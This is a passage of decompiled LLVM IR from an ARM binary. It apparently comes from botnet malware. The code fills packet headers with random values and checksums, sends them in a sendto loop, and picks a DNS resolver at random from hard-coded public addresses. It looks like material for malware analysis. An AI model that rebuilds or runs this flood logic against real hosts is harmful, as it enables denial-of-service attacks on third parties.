  %v0_ef00.off0 = phi i8 [ %v1_eed857.off0, %dec_label_pc_ef00.loopexit ], [ %extract.t79, %bb147 ]
  %v3_ef00 = inttoptr i32 %v2_ef00 to i8*
  store i8 %v0_ef00.off0, i8* %v3_ef00, align 1
  %v3_ef04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_ec38, i32* %r1.global-to-local, align 4
  %v0_ef0c = load i32, i32* %r4.global-to-local, align 4
  %v2_ef0c = add i32 %v0_ef0c, %v2_ec38
  store i32 %v2_ef0c, i32* %r3.global-to-local, align 4
  %v1_ef10 = add i32 %v3_ef04, 1
  store i32 %v1_ef10, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* %lr.global-to-local, align 4
  %v9_ef20 = icmp eq i32 %v1_e9d8, %v1_ef10
  store i1 %v9_ef20, i1* %cpsr_z.global-to-local, align 1
  %v1_ef24 = add i32 %v2_ef0c, 2
  store i32 %v1_ef24, i32* %r2.global-to-local, align 4
  %v4_ef28 = inttoptr i32 %v1_ef24 to i8*
  store i8 0, i8* %v4_ef28, align 1
  %v0_ef2c = load i32, i32* %lr.global-to-local, align 4
  %v1_ef2c = trunc i32 %v0_ef2c to i8
  %v2_ef2c = load i32, i32* %r2.global-to-local, align 4
  %v3_ef2c = add i32 %v2_ef2c, 3
  %v4_ef2c = inttoptr i32 %v3_ef2c to i8*
  store i8 %v1_ef2c, i8* %v4_ef2c, align 1
  %v0_ef30 = load i32, i32* %lr.global-to-local, align 4
  %v1_ef30 = trunc i32 %v0_ef30 to i8
  %v2_ef30 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef30 = add i32 %v2_ef30, 1
  %v4_ef30 = inttoptr i32 %v3_ef30 to i8*
  store i8 %v1_ef30, i8* %v4_ef30, align 1
  %v0_ef34 = load i32, i32* %ip.global-to-local, align 4
  %v1_ef34 = trunc i32 %v0_ef34 to i8
  %v2_ef34 = load i32, i32* %r2.global-to-local, align 4
  %v3_ef34 = add i32 %v2_ef34, 2
  %v4_ef34 = inttoptr i32 %v3_ef34 to i8*
  store i8 %v1_ef34, i8* %v4_ef34, align 1
  %v0_ef38 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ef38, i32* %stack_var_-40, align 4
  %v8_ef3c = icmp sgt i32 %v1_e9d8, %v1_ef10
  br i1 %v8_ef3c, label %dec_label_pc_ed98, label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef00, %dec_label_pc_f10c
  %v4_efb0.pre-phi = phi i32 [ %v4_f110, %dec_label_pc_f10c ], [ %v4_ece4, %dec_label_pc_ef00 ]
  store i32 %v1_e9d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_ecbc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef4c, %dec_label_pc_f070, %dec_label_pc_ef40
  br i1 %v2_ecbc, label %dec_label_pc_ef4c, label %dec_label_pc_ef50

dec_label_pc_ef50:                                ; preds = %dec_label_pc_ef4c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_ef60 = load i32, i32* @fp, align 4
  %v1_ef60 = add i32 %v0_ef60, 27
  store i32 %v1_ef60, i32* @sb, align 4
  %v1_ef64 = add i32 %v0_ef60, 47
  store i32 %v1_ef64, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_ef6c:                                ; preds = %dec_label_pc_efac.dec_label_pc_ef6c_crit_edge, %dec_label_pc_ef50
  %v1_ef8c = phi i32 [ %v1_ef78.pre, %dec_label_pc_efac.dec_label_pc_ef6c_crit_edge ], [ 65535, %dec_label_pc_ef50 ]
  %v1_ef74 = phi i32 [ %v1_f05c, %dec_label_pc_efac.dec_label_pc_ef6c_crit_edge ], [ 0, %dec_label_pc_ef50 ]
  store i32 %v4_e9f0, i32* %r3.global-to-local, align 4
  store i32 %v3_ecac, i32* %r8.global-to-local, align 4
  %v4_ef74 = mul i32 %v1_ef74, 4
  %v5_ef74 = add i32 %v4_ef74, %v4_e9f0
  %v6_ef74 = inttoptr i32 %v5_ef74 to i32*
  %v7_ef74 = load i32, i32* %v6_ef74, align 4
  store i32 %v7_ef74, i32* @r4, align 4
  %v9_ef78 = icmp eq i32 %v3_ecac, %v1_ef8c
  store i1 %v9_ef78, i1* %cpsr_z.global-to-local, align 1
  %v1_ef7c = add i32 %v7_ef74, 20
  store i32 %v1_ef7c, i32* @r5, align 4
  %v1_ef80 = add i32 %v7_ef74, 28
  store i32 %v1_ef80, i32* @r8, align 4
  br i1 %v9_ef78, label %dec_label_pc_f080, label %dec_label_pc_ef88

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef6c
  store i32 %v3_ecb0, i32* %ip.global-to-local, align 4
  %v9_ef8c = icmp eq i32 %v3_ecb0, %v1_ef8c
  store i1 %v9_ef8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef8c, label %dec_label_pc_f09c, label %dec_label_pc_ef94

dec_label_pc_ef94:                                ; preds = %dec_label_pc_f080.dec_label_pc_ef94_crit_edge, %dec_label_pc_ef88
  %v1_ef98 = phi i32 [ %v1_ef98.pre, %dec_label_pc_f080.dec_label_pc_ef94_crit_edge ], [ %v1_ef8c, %dec_label_pc_ef88 ]
  store i32 %v3_ecb4, i32* %lr.global-to-local, align 4
  %v9_ef98 = icmp eq i32 %v3_ecb4, %v1_ef98
  store i1 %v9_ef98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef98, label %dec_label_pc_f0b8, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_f09c.dec_label_pc_efa0_crit_edge, %dec_label_pc_ef94
  %v1_efa4 = phi i32 [ %v1_efa4.pre, %dec_label_pc_f09c.dec_label_pc_efa0_crit_edge ], [ %v1_ef98, %dec_label_pc_ef94 ]
  store i32 %v3_ecb8, i32* %r0.global-to-local, align 4
  %v9_efa4 = icmp eq i32 %v3_ecb8, %v1_efa4
  store i1 %v9_efa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_efa4, label %dec_label_pc_f0d4, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_f0b8, %dec_label_pc_efa0, %dec_label_pc_f0d4
  %v0_efac = load i32, i32* @r4, align 4
  %v1_efac = add i32 %v0_efac, 41
  store i32 %v1_efac, i32* %r0.global-to-local, align 4
  store i32 %v4_efb0.pre-phi, i32* %r1.global-to-local, align 4
  %v2_efb4 = call i32 @function_10c1c(i32 %v1_efac, i32 %v4_efb0.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_efbc = load i32, i32* @r7, align 4
  %v1_efbc = trunc i32 %v0_efbc to i8
  %v2_efbc = load i32, i32* @r4, align 4
  %v3_efbc = add i32 %v2_efbc, 10
  %v4_efbc = inttoptr i32 %v3_efbc to i8*
  store i8 %v1_efbc, i8* %v4_efbc, align 1
  %v0_efc0 = load i32, i32* @r7, align 4
  %v1_efc0 = trunc i32 %v0_efc0 to i8
  %v2_efc0 = load i32, i32* @r4, align 4
  %v3_efc0 = add i32 %v2_efc0, 11
  %v4_efc0 = inttoptr i32 %v3_efc0 to i8*
  store i8 %v1_efc0, i8* %v4_efc0, align 1
  %v0_efc4 = load i32, i32* @r4, align 4
  store i32 %v0_efc4, i32* @r0, align 4
  %v2_efc8 = call i32 @function_f17c(i32 %v0_efc4, i32 20)
  %v3_efc8 = trunc i32 %v2_efc8 to i8
  store i32 %v2_efc8, i32* %r0.global-to-local, align 4
  %v4_efcc = sdiv i32 %v2_efc8, 256
  store i32 %v4_efcc, i32* %r3.global-to-local, align 4
  %v1_efd0 = trunc i32 %v4_efcc to i8
  %v2_efd0 = load i32, i32* @r4, align 4
  %v3_efd0 = add i32 %v2_efd0, 11
  %v4_efd0 = inttoptr i32 %v3_efd0 to i8*
  store i8 %v1_efd0, i8* %v4_efd0, align 1
  %v3_efd4 = load i32, i32* @r4, align 4
  %v4_efd4 = add i32 %v3_efd4, 10
  %v5_efd4 = inttoptr i32 %v4_efd4 to i8*
  store i8 %v3_efc8, i8* %v5_efd4, align 1
  %v0_efd8 = load i32, i32* @r7, align 4
  %v1_efd8 = trunc i32 %v0_efd8 to i8
  %v2_efd8 = load i32, i32* @r5, align 4
  %v3_efd8 = add i32 %v2_efd8, 6
  %v4_efd8 = inttoptr i32 %v3_efd8 to i8*
  store i8 %v1_efd8, i8* %v4_efd8, align 1
  %v0_efdc = load i32, i32* @r7, align 4
  %v1_efdc = trunc i32 %v0_efdc to i8
  %v2_efdc = load i32, i32* @r5, align 4
  %v3_efdc = add i32 %v2_efdc, 7
  %v4_efdc = inttoptr i32 %v3_efdc to i8*
  store i8 %v1_efdc, i8* %v4_efdc, align 1
  %v0_efe0 = load i32, i32* @r4, align 4
  %v1_efe0 = add i32 %v0_efe0, 24
  %v2_efe0 = inttoptr i32 %v1_efe0 to i8*
  %v3_efe0 = load i8, i8* %v2_efe0, align 1
  %v4_efe0 = zext i8 %v3_efe0 to i32
  store i32 %v4_efe0, i32* %r3.global-to-local, align 4
  %v1_efe4 = add i32 %v0_efe0, 25
  %v2_efe4 = inttoptr i32 %v1_efe4 to i8*
  %v3_efe4 = load i8, i8* %v2_efe4, align 1
  %v4_efe4 = zext i8 %v3_efe4 to i32
  %v0_efe8 = load i32, i32* @r5, align 4
  store i32 %v0_efe8, i32* @r1, align 4
  %v4_efec = mul nuw nsw i32 %v4_efe4, 256
  %v5_efec = or i32 %v4_efec, %v4_efe0
  store i32 %v5_efec, i32* %r2.global-to-local, align 4
  store i32 %v0_efe0, i32* %r0.global-to-local, align 4
  %v0_eff4 = load i32, i32* @sb, align 4
  store i32 %v0_eff4, i32* %r3.global-to-local, align 4
  %v4_eff8 = call i32 @function_f1d8(i32 %v0_efe0, i32 %v0_efe8, i32 %v5_efec, i32 %v0_eff4)
  %v5_eff8 = trunc i32 %v4_eff8 to i8
  store i32 %v4_eff8, i32* %r0.global-to-local, align 4
  %v3_effc = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_f00c = mul i32 %v3_effc, 24
  %v2_f010 = add i32 %v5_f00c, %arg2
  store i32 %v2_f010, i32* %lr.global-to-local, align 4
  %v4_f014 = sdiv i32 %v4_eff8, 256
  store i32 %v4_f014, i32* %r3.global-to-local, align 4
  %v3_f018 = load i32, i32* @r5, align 4
  %v4_f018 = add i32 %v3_f018, 6
  %v5_f018 = inttoptr i32 %v4_f018 to i8*
  store i8 %v5_eff8, i8* %v5_f018, align 1
  %v0_f01c = load i32, i32* %r3.global-to-local, align 4
  %v1_f01c = trunc i32 %v0_f01c to i8
  %v2_f01c = load i32, i32* @r5, align 4
  %v3_f01c = add i32 %v2_f01c, 7
  %v4_f01c = inttoptr i32 %v3_f01c to i8*
  store i8 %v1_f01c, i8* %v4_f01c, align 1
  %v0_f020 = load i32, i32* %r2.global-to-local, align 4
  %v1_f020 = load i32, i32* %lr.global-to-local, align 4
  %v2_f020 = add i32 %v1_f020, 4
  %v3_f020 = inttoptr i32 %v2_f020 to i32*
  store i32 %v0_f020, i32* %v3_f020, align 4
  %v0_f024 = load i32, i32* @r4, align 4
  %v1_f024 = add i32 %v0_f024, 20
  %v2_f024 = inttoptr i32 %v1_f024 to i32*
  %v3_f024 = load i32, i32* %v2_f024, align 4
  %v3_f028 = udiv i32 %v3_f024, 65536
  store i32 %v3_f028, i32* %r3.global-to-local, align 4
  %v3_f02c13 = udiv i32 %v3_f024, 16777216
  %v1_f030 = trunc i32 %v3_f02c13 to i8
  %v2_f030 = load i32, i32* %lr.global-to-local, align 4
  %v3_f030 = add i32 %v2_f030, 3
  %v4_f030 = inttoptr i32 %v3_f030 to i8*
  store i8 %v1_f030, i8* %v4_f030, align 1
  %v0_f034 = load i32, i32* %r3.global-to-local, align 4
  %v1_f034 = trunc i32 %v0_f034 to i8
  %v2_f034 = load i32, i32* %lr.global-to-local, align 4
  %v3_f034 = add i32 %v2_f034, 2
  %v4_f034 = inttoptr i32 %v3_f034 to i8*
  store i8 %v1_f034, i8* %v4_f034, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f040 = load i32, i32* @r4, align 4
  store i32 %v0_f040, i32* %r1.global-to-local, align 4
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  %v0_f048 = load i32, i32* @sl, align 4
  store i32 %v0_f048, i32* %r2.global-to-local, align 4
  %v0_f04c = load i32, i32* %lr.global-to-local, align 4
  %v4_f04c = inttoptr i32 %v0_f04c to %sockaddr*
  %v7_f054 = inttoptr i32 %v0_f040 to i32*
  %v9_f054 = call i32 @sendto(i32 %v3_ec4c, i32* %v7_f054, i32 %v0_f048, i32 16384, %sockaddr* %v4_f04c, i32 16)
  %v3_f058 = load i32, i32* %stack_var_-40, align 4
  %v1_f05c = add i32 %v3_f058, 1
  store i32 %v1_f05c, i32* %r0.global-to-local, align 4
  store i32 %v1_e9d8, i32* %r3.global-to-local, align 4
  %v9_f064 = icmp eq i32 %v1_e9d8, %v1_f05c
  store i1 %v9_f064, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f05c, i32* %stack_var_-40, align 4
  %v8_f06c = icmp sgt i32 %v1_e9d8, %v1_f05c
  br i1 %v8_f06c, label %dec_label_pc_efac.dec_label_pc_ef6c_crit_edge, label %dec_label_pc_f070

dec_label_pc_efac.dec_label_pc_ef6c_crit_edge:    ; preds = %dec_label_pc_efac
  %v1_ef78.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ef6c

dec_label_pc_f070:                                ; preds = %dec_label_pc_efac
  store i32 %v1_e9d8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef4c

dec_label_pc_f080:                                ; preds = %dec_label_pc_ef6c
  %v0_f080 = call i32 @function_10b68()
  %v1_f080 = trunc i32 %v0_f080 to i8
  store i32 %v0_f080, i32* %r0.global-to-local, align 4
  store i32 %v3_ecb0, i32* %ip.global-to-local, align 4
  %v4_f088 = sdiv i32 %v0_f080, 256
  store i32 %v4_f088, i32* %r3.global-to-local, align 4
  %v1_f08c = load i32, i32* @r6, align 4
  %v9_f08c = icmp eq i32 %v3_ecb0, %v1_f08c
  store i1 %v9_f08c, i1* %cpsr_z.global-to-local, align 1
  %v1_f090 = trunc i32 %v4_f088 to i8
  %v2_f090 = load i32, i32* @r4, align 4
  %v3_f090 = add i32 %v2_f090, 5
  %v4_f090 = inttoptr i32 %v3_f090 to i8*
  store i8 %v1_f090, i8* %v4_f090, align 1
  %v3_f094 = load i32, i32* @r4, align 4
  %v4_f094 = add i32 %v3_f094, 4
  %v5_f094 = inttoptr i32 %v4_f094 to i8*
  store i8 %v1_f080, i8* %v5_f094, align 1
  %v0_f098 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f098, label %dec_label_pc_f09c, label %dec_label_pc_f080.dec_label_pc_ef94_crit_edge

dec_label_pc_f080.dec_label_pc_ef94_crit_edge:    ; preds = %dec_label_pc_f080
  %v1_ef98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ef94

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f080, %dec_label_pc_ef88
  %v0_f09c = call i32 @function_10b68()
  %v1_f09c = trunc i32 %v0_f09c to i8
  store i32 %v0_f09c, i32* %r0.global-to-local, align 4
  store i32 %v3_ecb4, i32* %lr.global-to-local, align 4
  %v4_f0a4 = sdiv i32 %v0_f09c, 256
  store i32 %v4_f0a4, i32* %r3.global-to-local, align 4
  %v1_f0a8 = load i32, i32* @r6, align 4
  %v9_f0a8 = icmp eq i32 %v3_ecb4, %v1_f0a8
  store i1 %v9_f0a8, i1* %cpsr_z.global-to-local, align 1
  %v3_f0ac = load i32, i32* @r4, align 4
  %v4_f0ac = add i32 %v3_f0ac, 20
  %v5_f0ac = inttoptr i32 %v4_f0ac to i8*
  store i8 %v1_f09c, i8* %v5_f0ac, align 1
  %v0_f0b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f0b0 = trunc i32 %v0_f0b0 to i8
  %v2_f0b0 = load i32, i32* @r5, align 4
  %v3_f0b0 = add i32 %v2_f0b0, 1
  %v4_f0b0 = inttoptr i32 %v3_f0b0 to i8*
  store i8 %v1_f0b0, i8* %v4_f0b0, align 1
  %v0_f0b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0b4, label %dec_label_pc_f0b8, label %dec_label_pc_f09c.dec_label_pc_efa0_crit_edge

dec_label_pc_f09c.dec_label_pc_efa0_crit_edge:    ; preds = %dec_label_pc_f09c
  %v1_efa4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_efa0

dec_label_pc_f0b8:                                ; preds = %dec_label_pc_f09c, %dec_label_pc_ef94
  %v0_f0b8 = call i32 @function_10b68()
  %v1_f0b8 = trunc i32 %v0_f0b8 to i8
  %v4_f0bc = sdiv i32 %v0_f0b8, 256
  store i32 %v4_f0bc, i32* %r3.global-to-local, align 4
  %v3_f0c0 = load i32, i32* @r5, align 4
  %v4_f0c0 = add i32 %v3_f0c0, 2
  %v5_f0c0 = inttoptr i32 %v4_f0c0 to i8*
  store i8 %v1_f0b8, i8* %v5_f0c0, align 1
  store i32 %v3_ecb8, i32* %r0.global-to-local, align 4
  %v1_f0c8 = load i32, i32* @r6, align 4
  %v9_f0c8 = icmp eq i32 %v3_ecb8, %v1_f0c8
  store i1 %v9_f0c8, i1* %cpsr_z.global-to-local, align 1
  %v0_f0cc = load i32, i32* %r3.global-to-local, align 4
  %v1_f0cc = trunc i32 %v0_f0cc to i8
  %v2_f0cc = load i32, i32* @r5, align 4
  %v3_f0cc = add i32 %v2_f0cc, 3
  %v4_f0cc = inttoptr i32 %v3_f0cc to i8*
  store i8 %v1_f0cc, i8* %v4_f0cc, align 1
  %v0_f0d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f0d0, label %dec_label_pc_f0d4, label %dec_label_pc_efac

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_f0b8, %dec_label_pc_efa0
  %v0_f0d4 = call i32 @function_10b68()
  %v1_f0d4 = trunc i32 %v0_f0d4 to i8
  store i32 %v0_f0d4, i32* %r0.global-to-local, align 4
  %v4_f0d8 = sdiv i32 %v0_f0d4, 256
  store i32 %v4_f0d8, i32* %r3.global-to-local, align 4
  %v3_f0dc = load i32, i32* @r4, align 4
  %v4_f0dc = add i32 %v3_f0dc, 28
  %v5_f0dc = inttoptr i32 %v4_f0dc to i8*
  store i8 %v1_f0d4, i8* %v5_f0dc, align 1
  %v0_f0e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f0e0 = trunc i32 %v0_f0e0 to i8
  %v2_f0e0 = load i32, i32* @r8, align 4
  %v3_f0e0 = add i32 %v2_f0e0, 1
  %v4_f0e0 = inttoptr i32 %v3_f0e0 to i8*
  store i8 %v1_f0e0, i8* %v4_f0e0, align 1
  br label %dec_label_pc_efac

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_ebb4, %dec_label_pc_eb80, %dec_label_pc_e9cc, %dec_label_pc_eb24
  %v0_f0e8 = call i32 @function_10b68()
  %v1_f0ec = urem i32 %v0_f0e8, 4
  store i32 %v1_f0ec, i32* %r0.global-to-local, align 4
  %v2_f0f0 = icmp eq i32 %v1_f0ec, 3
  store i1 %v2_f0f0, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_f0e8 to i2
  switch i2 %trunc, label %dec_label_pc_ec2821 [
    i2 0, label %dec_label_pc_f130
    i2 1, label %dec_label_pc_f144
    i2 -2, label %dec_label_pc_f150
    i2 -1, label %dec_label_pc_f160
  ]

dec_label_pc_f10c:                                ; preds = %dec_label_pc_ec88
  store i32 %v2_ec38, i32* %r0.global-to-local, align 4
  %v4_f110 = sext i8 %v5_eca4 to i32
  store i32 %v4_f110, i32* %r1.global-to-local, align 4
  %v2_f114 = add i32 %v4_f110, %v2_ec38
  store i32 %v2_f114, i32* @fp, align 4
  br label %dec_label_pc_ef40

dec_label_pc_f11c:                                ; preds = %dec_label_pc_ec5c
  store i32 %v3_ec4c, i32* %r0.global-to-local, align 4
  %v1_f120 = call i32 @close(i32 %v3_ec4c)
  store i32 %v1_f120, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_ec34, %dec_label_pc_ec28, %dec_label_pc_f11c
  %v29_f12c = phi i32 [ %v3_ec4c, %dec_label_pc_ec34 ], [ %v29_f12c75, %dec_label_pc_ec28 ], [ %v1_f120, %dec_label_pc_f11c ]
  store i32 %v3_e9cc, i32* %r4.global-to-local, align 4
  store i32 %v6_e9cc, i32* %r5.global-to-local, align 4
  store i32 %v9_e9cc, i32* %r6.global-to-local, align 4
  store i32 %v12_e9cc, i32* %r7.global-to-local, align 4
  store i32 %v15_e9cc, i32* %r8.global-to-local, align 4
  store i32 %v18_e9cc, i32* %sb.global-to-local, align 4
  store i32 %v21_e9cc, i32* %sl.global-to-local, align 4
  store i32 %v24_e9cc, i32* %fp.global-to-local, align 4
  ret i32 %v29_f12c

dec_label_pc_f130:                                ; preds = %dec_label_pc_f0e8
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ec28

dec_label_pc_f144:                                ; preds = %dec_label_pc_f0e8
  store i32 707416650, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec28

dec_label_pc_f150:                                ; preds = %dec_label_pc_f0e8
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ec28

dec_label_pc_f160:                                ; preds = %dec_label_pc_f0e8
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec28

; uselistorder directives
  uselistorder i32 %v4_f110, { 0, 2, 1 }
  uselistorder i32 %v1_f0ec, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_f0e8, { 1, 0 }
  uselistorder i32 %v0_f0d4, { 0, 2, 1 }
  uselistorder i32 %v0_f09c, { 0, 2, 1 }
  uselistorder i32 %v4_f088, { 1, 0 }
  uselistorder i32 %v0_f080, { 0, 2, 1 }
  uselistorder i32 %v1_f05c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_eff8, { 0, 2, 1 }
  uselistorder i32 %v0_efe0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_efcc, { 1, 0 }
  uselistorder i32 %v2_efc8, { 0, 2, 1 }
  uselistorder i32 %v7_ef74, { 1, 0, 2 }
  uselistorder i32 %v4_efb0.pre-phi, { 1, 0 }
  uselistorder i32 %v2_eef4, { 1, 0 }
  uselistorder i32 %v1_eee887, { 1, 0, 2 }
  uselistorder i32 %v1_eedc, { 2, 1, 0 }
  uselistorder i32 %v0_eedc, { 1, 2, 0 }
  uselistorder i32 %v0_eedc33, { 1, 0 }
  uselistorder i32 %v1_eedc34, { 2, 0, 1 }
  uselistorder i8 %extract.t79, { 1, 0 }
  uselistorder i32 %v1_eeb0, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_ee2c, { 1, 0 }
  uselistorder i32 %v3_ed68, { 1, 0, 2 }
  uselistorder i32 %v1_ed30, { 1, 0 }
  uselistorder i32 %v1_ed24, { 1, 0 }
  uselistorder i32 %v1_ed08, { 1, 0 }
  uselistorder i32 %v1_ecf4, { 1, 0 }
  uselistorder i32 %v3_ecec, { 1, 0 }
  uselistorder i32 %v4_ece4, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_eca4, { 1, 0 }
  uselistorder i32 %v0_eca0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ec9c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ec94, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_ec80, { 1, 0 }
  uselistorder i1 %v7_ec50, { 1, 0 }
  uselistorder i32 %v3_ec4c, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_ec38, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v3_ec20, { 1, 0, 2 }
  uselistorder i1 %v7_ebf0, { 1, 0 }
  uselistorder i32 %v1_ebec, { 1, 0, 2 }
  uselistorder i1 %v8_ebe4, { 1, 0 }
  uselistorder i1 %v7_ebe0, { 1, 0 }
  uselistorder i32 %v1_ebd4, { 1, 0 }
  uselistorder i8 %v2_ebc8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ebcc, { 1, 0 }
  uselistorder i32 %v0_ebec, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ebb8, { 0, 2, 1 }
  uselistorder i32 %v1_ebd0, { 0, 2, 1 }
  uselistorder i32 %v2_eba0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_eb98, { 1, 0, 2, 3 }
  uselistorder i32 %v0_eb80, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_eb78, { 1, 0 }
  uselistorder i32 %v0_eb78, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_eb1c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_eaec, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_ea70, { 1, 0 }
  uselistorder i32 %v7_ea2c, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_ea28, { 1, 0 }
  uselistorder i32 %v6_ea08, { 1, 0 }
  uselistorder i32 %v4_e9f0, { 0, 3, 1, 2 }
  uselistorder i32 %v1_e9d8, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 5, 6, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 1, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 13, 12, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 5, 7, 6, 8, 3, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 20, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 11, 10, 12, 14, 13, 15, 16, 17, 18, 9, 34, 35, 1, 49, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 53, 50, 51, 52, 54, 56, 55, 57, 59, 58, 60, 62, 61, 64, 63, 65, 66, 68, 67, 69, 20, 19, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 4, 5, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 6, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 29, 31, 32, 33, 30, 27, 34, 35, 15 }
  uselistorder i32 47, { 3, 4, 5, 0, 6, 1, 7, 2, 8, 9 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i32 (i8*)* @inet_addr, { 1, 0, 2 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_b240, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 84, 85, 86, 87, 88, 89, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 90, 91 }
  uselistorder label %dec_label_pc_f124, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f0e8, { 0, 1, 3, 2 }
